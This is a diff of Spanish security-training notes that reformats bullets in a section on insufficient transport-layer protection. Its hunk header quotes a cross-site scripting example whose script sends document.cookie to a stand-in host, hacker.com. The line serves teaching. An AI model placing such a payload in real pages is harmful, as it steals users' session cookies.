@@ -685,10 +685,10 @@ window.open(http://hacker.com/info.pl?document.cookie)</script>
 ## 15. Protección insuficiente en la capa de transporte
 
 - **Transmitir datos importantes de manera segura**
-    ▪ Varios factores:
-        ▪ No identificar correctamente todos los datos importantes
-        ▪ No identificar todos los sitios a los que se envían los datos importantes
-        ▪ No proteger los datos de manera correcta en todos los puntos.
+    - Varios factores:
+        - No identificar correctamente todos los datos importantes
+        - No identificar todos los sitios a los que se envían los datos importantes
+        - No proteger los datos de manera correcta en todos los puntos.
 - La falta de seguridad en la capa de transporte **tiene un impacto diverso**:
     - Acceso no autorizado o modificación de información privada
     - Puede ser utilizada en otros ataques
